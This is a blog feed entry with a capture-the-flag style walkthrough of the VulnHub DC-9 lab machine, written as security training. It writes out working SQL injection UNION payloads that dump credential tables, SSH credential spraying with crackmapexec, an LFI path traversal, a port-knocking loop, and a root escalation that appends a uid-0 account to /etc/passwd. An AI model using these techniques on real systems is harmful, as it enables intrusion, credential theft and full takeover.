<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>LFI on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/lfi/</link>
    <description>Recent content in LFI on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Wed, 02 Jun 2021 01:18:59 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/lfi/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>VulnHub - DC-9</title>
      <link>https://fahmifj.github.io/vulnhub/dc9/</link>
      <pubDate>Wed, 02 Jun 2021 01:18:59 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/vulnhub/dc9/</guid>
      <description>DC-9 from VulnHub features a website that is vulnerable to SQL injection.
I’m able to dump a bunch of users’ credentials by exploiting SQLi and gain a foothold on the system after spraying them on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.
Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full nmap scan broke that rule.</description>
      <content:encoded><![CDATA[<p>DC-9 from VulnHub features a website that is vulnerable to SQL injection.</p>
<p>I’m able to dump a bunch of users’ credentials by exploiting SQLi and gain a foothold on the system after spraying them on SSH. One of the users has a sudo privileges on a custom binary which allows me to perform an arbitrary file write with root access.</p>
<p>Actually, there is a port knocking rule in this machine to open the SSH port, but when I first solved this machine, my full <code>nmap</code> scan broke that rule. Even though I gained a foothold by skipping the LFI and port knocking, I&rsquo;ll still include the intended way (LFI and port knocking) in the foothold section.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Blind SQL injection</li>
<li>Local file Inclusion</li>
<li>Port knocking</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Arpscan</li>
<li>CrackMapExec</li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="host-discovery---arp-scan">Host Discovery - arp-scan</h3>
<p><code>192.168.2.102</code> is the target.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ arp-scan --interface eth0 192.168.2.0/24 <span class="p">|</span> tee scans/00-arp-scan
</span></span><span class="line"><span class="cl">Interface: eth0, type: EN10MB, MAC: 08:00:27:0b:94:f0, IPv4: 192.168.2.103
</span></span><span class="line"><span class="cl">Starting arp-scan 1.9.7 with <span class="m">256</span> hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
</span></span><span class="line"><span class="cl">192.168.2.2     0a:00:27:00:00:0a       <span class="o">(</span>Unknown: locally administered<span class="o">)</span>
</span></span><span class="line"><span class="cl">192.168.2.1     08:00:27:d9:63:87       PCS Systemtechnik GmbH
</span></span><span class="line"><span class="cl">192.168.2.102   08:00:27:54:bc:fd       PCS Systemtechnik GmbH
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="m">3</span> packets received by filter, <span class="m">0</span> packets dropped by kernel
</span></span><span class="line"><span class="cl">Ending arp-scan 1.9.7: <span class="m">256</span> hosts scanned in 1.986 seconds <span class="o">(</span>128.90 hosts/sec<span class="o">)</span>. <span class="m">3</span> responded
</span></span></code></pre></div><h3 id="port-scan---nmap">Port Scan - nmap</h3>
<p><code>nmap</code> shows two ports available, 80 (HTTP) and 22 (SSH). SSH port is in filtered state.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ nmap -n -sC -sV -oA scans/10-initial-dc9 <span class="s1">&#39;192.168.2.102&#39;</span> -v
</span></span><span class="line"><span class="cl"><span class="c1"># Nmap 7.80 scan initiated Thu Apr  8 02:43:51 2021 as: nmap -n -sC -sV -oA scans/10-initial-dc9 -v 192.168.2.102</span>
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.2.102
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00048s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed ports
</span></span><span class="line"><span class="cl">PORT   STATE    SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp filtered ssh
</span></span><span class="line"><span class="cl">80/tcp open     http    Apache httpd 2.4.38 <span class="o">((</span>Debian<span class="o">))</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span> http-methods: 
</span></span><span class="line"><span class="cl"><span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.38 <span class="o">(</span>Debian<span class="o">)</span>
</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Example.com - Staff Details - Welcome
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:54:BC:FD <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</span></span></code></pre></div><p>But, later it turns into open state after a full port scan performed.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ nmap -n -p22 192.168.2.102
</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-04-08 05:21 EDT
</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.2.102
</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.00075s latency<span class="o">)</span>.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT   STATE SERVICE
</span></span><span class="line"><span class="cl">22/tcp open  ssh
</span></span><span class="line"><span class="cl">MAC Address: 08:00:27:54:BC:FD <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
</span></span></code></pre></div><p>I can confirms it with <code>netcat</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ nc 192.168.2.102 <span class="m">22</span>
</span></span><span class="line"><span class="cl">SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</span></span></code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>The home page of this site doesn&rsquo;t provide anything useful.</p>
<p><div class="img-container"><img src="imgs/image-20210408134805695.png" alt="image-20210408134805695"  /></div>
</p>
<p>The Display All Records menu functions to display all user records.</p>
<p><div class="img-container"><img src="imgs/image-20210408134819215.png" alt="image-20210408134819215"  /></div>
</p>
<p>There is a user input on the Search menu</p>
<p><div class="img-container"><img src="imgs/image-20210408134833069.png" alt="image-20210408134833069"  /></div>
</p>
<p>The Manage menu has login function.</p>
<p><div class="img-container"><img src="imgs/image-20210408134853665.png" alt="image-20210408134853665"  /></div>
</p>
<p>From here I can assume that the website uses database.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="sql-injection">SQL injection</h3>
<h4 id="identify">Identify</h4>
<p>There&rsquo;s error-based SQL injection on <code>search.php</code>, and the initial detection is simple, <em>when I try put <code>'</code> it gives bug</em> (joke <a href="https://twitter.com/LiveOverflow/status/1313157161007054854">reference</a>).</p>
<p>In this web, the SQLi vulnerability can be identified by adding a single quote  (&rsquo;`) at the end of users&rsquo; first name that I want to search.</p>
<p><div class="img-container"><img src="imgs/image-20210602031408130.png" alt="image-20210602031408130"  /></div>
</p>
<p>Based on the search page, you can only input one name (either the first or the last name) and it will return a single record, so without <code>'</code>, the search should return one related result.</p>
<p><div class="img-container"><img src="imgs/image-20210602031344011.png" alt="image-20210602031344011"  /></div>
</p>
<p>But then, when I submit <code>' OR 1=1 -- -'</code>, it returns all the records.</p>
<p><div class="img-container"><img src="imgs/image-20210602030509083.png" alt="image-20210602030509083"  /></div>
</p>
<h4 id="union-injection">UNION injection</h4>
<p>To perform the SQL union injection attack manually, I&rsquo;ll have to identify the available columns and its data type.</p>
<p>There are 6 columns with the data type of each column is string. The injection query is as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT &#39;</span><span class="n">a</span><span class="s1">&#39;,&#39;</span><span class="n">b</span><span class="s1">&#39;,&#39;</span><span class="k">c</span><span class="s1">&#39;,&#39;</span><span class="n">d</span><span class="s1">&#39;,&#39;</span><span class="n">e</span><span class="s1">&#39;,&#39;</span><span class="n">f</span><span class="s1">&#39; -- 
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033329668.png" alt="image-20210602033329668"  /></div>
</p>
<p>I’ll pull out database version, current database, and the available databases.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT @@version, &#39;</span><span class="k">Current</span><span class="w"> </span><span class="n">DB</span><span class="p">:</span><span class="s1">&#39;, database(), group_concat(SCHEMA_NAME),5,6 FROM information_schema.schemata -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602033848222.png" alt="image-20210602033848222"  /></div>
</p>
<p>The website uses MariaDB as its database. The database currently in use is <code>Staff</code>. <code>Staff</code> and <code>users</code> are non-default database, so I&rsquo;ll look into these tables.</p>
<p>With the following query, I can get the two tables name from database <code>Staff</code>: <code>StaffDetails</code> and <code>Users</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT table_name,2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span><span class="n">Staff</span><span class="s1">&#39; -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602034617576.png" alt="image-20210602034617576"  /></div>
</p>
<p><code>StaffDetails</code> contains the all the staff records which previously seen at the Display All Records menu.</p>
<p>I’ll get the columns name of the table <code>Users</code> with the following query:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT group_concat(column_name), 2,3,4,5,6 from information_schema.columns where table_name = &#39;</span><span class="n">Users</span><span class="s1">&#39; -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602035249528.png" alt="image-20210602035249528"  /></div>
</p>
<p>I will get the contents of the Username and the Password columns, and it returns a set of credentials.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT group_concat(username, &#39;</span><span class="p">:</span><span class="s1">&#39;, password),2,3,4,5,6 FROM Users -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602040550090.png" alt="image-20210602040550090"  /></div>
</p>
<p>The password is in md5 format.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> 856f5de590ef37314e7c3bdf6f8a66dc <span class="p">|</span> wc -c
</span></span><span class="line"><span class="cl"><span class="m">33</span>
</span></span></code></pre></div><p>The hash can be cracked online. The credentials is <code>admin:transorbital1</code>, and I’ll just keep that for now.</p>
<p><div class="img-container"><img src="imgs/image-20210602044447046.png" alt="image-20210602044447046"  /></div>
</p>
<p>On database <code>users</code>,  there is only one table called <code>UserDetails</code>. Here is the query.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39;UNION SELECT group_concat(table_name),2,3,4,5,6 FROM information_schema.tables where table_schema = &#39;</span><span class="n">users</span><span class="s1">&#39; -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041638341.png" alt="image-20210602041638341"  /></div>
</p>
<p>With the following query, I can get the columns on table <code>UserDetails</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT group_concat(column_name),2,3,4,5,6 from information_schema.columns where table_name = &#39;</span><span class="n">UserDetails</span><span class="s1">&#39; -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041745247.png" alt="image-20210602041745247"  /></div>
</p>
<p><code>UserDetails</code> has 6 columns, but I&rsquo;m interested only with the <code>username</code> and the <code>password</code> column, and I&rsquo;ll pull out the their contents.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s1">&#39; UNION SELECT group_concat(username,&#34;:&#34;,password),2,3,4,5,6 FROM users.UserDetails -- -
</span></span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602041822329.png" alt="image-20210602041822329"  /></div>
</p>
<p>That&rsquo;s a lot of credentials. I can sort these creds with <code>sed</code> command by substituting comma with new line.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ <span class="nb">echo</span> -n <span class="s1">&#39;marym:3kfs86sfd,julied:468sfdfsd2,fredf:4sfd87sfd1,barneyr:RocksOff,tomc:TC&amp;TheBoyz,jerrym:B8m#48sd,wilmaf:Pebbles,bettyr:BamBam01,chandlerb:UrAG0D!,joeyt:Passw0rd,rachelg:yN72#dsd,rossg:ILoveRachel,monicag:3248dsds7s,phoebeb:smellycats,scoots:YR3BVxxxw87,janitor:Ilovepeepee,janitor2:Hawaii-Five-0&#39;</span> <span class="p">|</span> sed -s <span class="s1">&#39;s/,/\n/g&#39;</span>
</span></span><span class="line"><span class="cl">marym:3kfs86sfd
</span></span><span class="line"><span class="cl">julied:468sfdfsd2
</span></span><span class="line"><span class="cl">fredf:4sfd87sfd1
</span></span><span class="line"><span class="cl">barneyr:RocksOff
</span></span><span class="line"><span class="cl">tomc:TC<span class="p">&amp;</span>TheBoyz
</span></span><span class="line"><span class="cl">jerrym:B8m#48sd
</span></span><span class="line"><span class="cl">wilmaf:Pebbles
</span></span><span class="line"><span class="cl">bettyr:BamBam01
</span></span><span class="line"><span class="cl">chandlerb:UrAG0D!
</span></span><span class="line"><span class="cl">joeyt:Passw0rd
</span></span><span class="line"><span class="cl">rachelg:yN72#dsd
</span></span><span class="line"><span class="cl">rossg:ILoveRachel
</span></span><span class="line"><span class="cl">monicag:3248dsds7s
</span></span><span class="line"><span class="cl">phoebeb:smellycats
</span></span><span class="line"><span class="cl">scoots:YR3BVxxxw87
</span></span><span class="line"><span class="cl">janitor:Ilovepeepee
</span></span><span class="line"><span class="cl">janitor2:Hawaii-Five-0
</span></span></code></pre></div><h3 id="shell-access">Shell access</h3>
<h4 id="ssh-login-brute-force">SSH Login brute-force</h4>
<p>Since the SSH port is open, I tried all the credentials I obtained from SQLi on SSH using <code>crackmapexec</code>. It returned 3 valid logins.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> chandlerb:UrAG0D! 
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> joeyt:Passw0rd 
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> janitor:Ilovepeepee 
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="intended-lfi-and-port-knocking">(Intended) LFI and Port Knocking</h4>
<p>In my case, I discovered that the website is vulnerable to LFI after inspecting the source code.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">chandlerb@dc-9:/var/www/html$ cat manage.php
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl"><span class="nv">$file</span> <span class="o">=</span> <span class="s1">&#39;contact-info.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$show_errors</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="o">[</span><span class="s1">&#39;display_errors&#39;</span><span class="o">]</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="o">(</span><span class="nv">$show_errors</span> <span class="o">==</span> <span class="s1">&#39;yes&#39;</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="o">(</span>file_exists<span class="o">(</span><span class="nv">$file</span><span class="o">))</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            include<span class="o">(</span><span class="nv">$file</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="nb">echo</span> <span class="s2">&#34;File does not exist&#34;</span> . <span class="s2">&#34;&lt;br /&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="c1"># LFI vulnerability starts from here</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;file&#39;</span><span class="o">]</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">            <span class="c1"># No input sanitization poc: manage?file=../../../../etc/passwd</span>
</span></span><span class="line"><span class="cl">            include<span class="o">(</span><span class="s1">&#39;directory/&#39;</span> . <span class="nv">$file</span><span class="o">)</span><span class="p">;</span> 
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>Using LFI is the intended way to gain a foothold before performing brute force. In order to exploit it, I previously had to login using the credentials I obtained through SQLi (<code>admin:transorbital1</code>).</p>
<p>With LFI can include  <code>/etc/knockd.conf</code> to read the knocking sequence to open the SSH port.</p>
<p><div class="img-container"><img src="imgs/image-20210602050027114.png" alt="image-20210602050027114"  /></div>
</p>
<p>In case the SSH port is closed, then to open it, I&rsquo;ll need to interact with port 7469,8475,9842 sequentially.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="m">7469</span> <span class="m">8475</span> 9842<span class="p">;</span> <span class="k">do</span> nc -w1 192.168.2.102 <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602051747909.png" alt="image-20210602051747909"  /></div>
</p>
<p>To close the port, I&rsquo;ll need to knock in reverse order:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="m">9842</span> <span class="m">8475</span> 7469<span class="p">;</span> <span class="k">do</span> nc -w1 192.168.2.102 <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210602052201358.png" alt="image-20210602052201358"  /></div>
</p>
<p>Then, from here, I should use SSH brute force (which I did earlier).</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-fredf">Shell as fredf</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>Only user janitor that has one valuable thing in its home dir, and that is a password list.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt 
</span></span><span class="line"><span class="cl">BamBam01
</span></span><span class="line"><span class="cl">Passw0rd
</span></span><span class="line"><span class="cl">smellycats
</span></span><span class="line"><span class="cl">P0Lic#10-4
</span></span><span class="line"><span class="cl">B4-Tru3-001
</span></span><span class="line"><span class="cl">4uGU5T-NiGHts
</span></span></code></pre></div><p>With those new password, I&rsquo;ll perform another brute force using <code>crackmapexec</code>.</p>
<h4 id="ssh---fredf">SSH - fredf</h4>
<p><code>crackmapexec</code> returns one valid login for <code>fred:B4-Tru3-001</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ crackmapexec ssh 192.168.2.102 -u users -p passwords --no-bruteforce --continue-on-success
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u1
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">SSH         192.168.2.102   <span class="m">22</span>     192.168.2.102    <span class="o">[</span>+<span class="o">]</span> fredf:B4-Tru3-001 
</span></span><span class="line"><span class="cl">...
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «dc-9» «192.168.2.103»
</span></span><span class="line"><span class="cl">$ ssh fredf@192.168.2.102
</span></span><span class="line"><span class="cl">fredf@192.168.2.102<span class="err">&#39;</span>s password:
</span></span><span class="line"><span class="cl">Linux dc-9 4.19.0-6-amd64 <span class="c1">#1 SMP Debian 4.19.67-2+deb10u2 (2019-11-11) x86_64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
</span></span><span class="line"><span class="cl">the exact distribution terms <span class="k">for</span> each program are described in the
</span></span><span class="line"><span class="cl">individual files in /usr/share/doc/*/copyright.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span class="line"><span class="cl">permitted by applicable law.
</span></span><span class="line"><span class="cl">Last login: Thu Apr  <span class="m">8</span> 20:10:42 <span class="m">2021</span> from 192.168.2.103
</span></span><span class="line"><span class="cl">fredf@dc-9:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1003<span class="o">(</span>fredf<span class="o">)</span>
</span></span></code></pre></div><h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-2">Enumeration</h4>
<p>User fredf has sudo privileges on a custom binary called <code>test</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">fredf@dc-9:/home$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> fredf on dc-9:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User fredf may run the following commands on dc-9:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /opt/devstuff/dist/test/test
</span></span></code></pre></div><p>I suspect <code>/opt/devstuff/test.py</code> is the actual code of that binary.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">fredf@dc-9:/opt/devstuff$ cat test.py 
</span></span><span class="line"><span class="cl"><span class="c1">#!/usr/bin/python</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">import sys
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> len <span class="o">(</span>sys.argv<span class="o">)</span> !<span class="o">=</span> <span class="m">3</span> :
</span></span><span class="line"><span class="cl">    print <span class="o">(</span><span class="s2">&#34;Usage: python test.py read append&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    sys.exit <span class="o">(</span>1<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">else</span> :
</span></span><span class="line"><span class="cl">    <span class="nv">f</span> <span class="o">=</span> open<span class="o">(</span>sys.argv<span class="o">[</span>1<span class="o">]</span>, <span class="s2">&#34;r&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="nv">output</span> <span class="o">=</span> <span class="o">(</span>f.read<span class="o">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">f</span> <span class="o">=</span> open<span class="o">(</span>sys.argv<span class="o">[</span>2<span class="o">]</span>, <span class="s2">&#34;a&#34;</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    f.write<span class="o">(</span>output<span class="o">)</span>
</span></span><span class="line"><span class="cl">    f.close<span class="o">()</span>
</span></span></code></pre></div><h4 id="script-analysis">Script Analysis</h4>
<p>It checks if the arguments are equal to 3. If it doesn&rsquo;t have 3 arguments, it exits.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">if</span> <span class="nb">len</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="p">(</span><span class="s2">&#34;Usage: python test.py read append&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span></code></pre></div><p>Otherwise, it reads a file specified on argv1 in read mode and store its contents to the variable <code>output</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">else</span> <span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">output</span> <span class="o">=</span> <span class="p">(</span><span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span></code></pre></div><p>Then it opens a file specified on argv2 in append mode and it adds the variable <code>output</code>  (the file contents of argv1) to that file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="s2">&#34;a&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">output</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></div><p>Since this gives arbitrary write on the system, it can be exploited in many ways, one of which is to add a new root account to <code>/etc/passwd</code>.</p>
<h4 id="exploitation">Exploitation</h4>
<p>First, I&rsquo;ll create a password hash using <code>openssl</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">fredf@dc-9:/tmp$ openssl passwd -1 -salt iamf pass123
</span></span><span class="line"><span class="cl"><span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>
</span></span></code></pre></div><p>I&rsquo;ll follow the flat database format of <code>/etc/passwd</code> to create my own user. I&rsquo;ll use the field property of root user, and substitute the password (<code>x</code> field) and the username with the one I specified.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1"># From this</span>
</span></span><span class="line"><span class="cl">root:x:0:0:root:/root:/bin/bash
</span></span><span class="line"><span class="cl"><span class="c1"># To</span>
</span></span><span class="line"><span class="cl">iamf:<span class="nv">$1$iamf$lq0NuDAhNy8IFlaFgiRw20</span>:0:0:root:/root:/bin/bash
</span></span></code></pre></div><p>I&rsquo;ll store that to a file called <code>/tmp/passwd</code>.</p>
<p>And now I can just append the content of <code>/tmp/passwd</code> to <code>/etc/passwd</code> using <code>/opt/devstuff/dist/test/test</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">fredf@dc-9:/tmp$ sudo /opt/devstuff/dist/test/test /tmp/passwd /etc/passwd
</span></span></code></pre></div><p>I can confirms my account is there (<code>/etc/passwd</code>).</p>
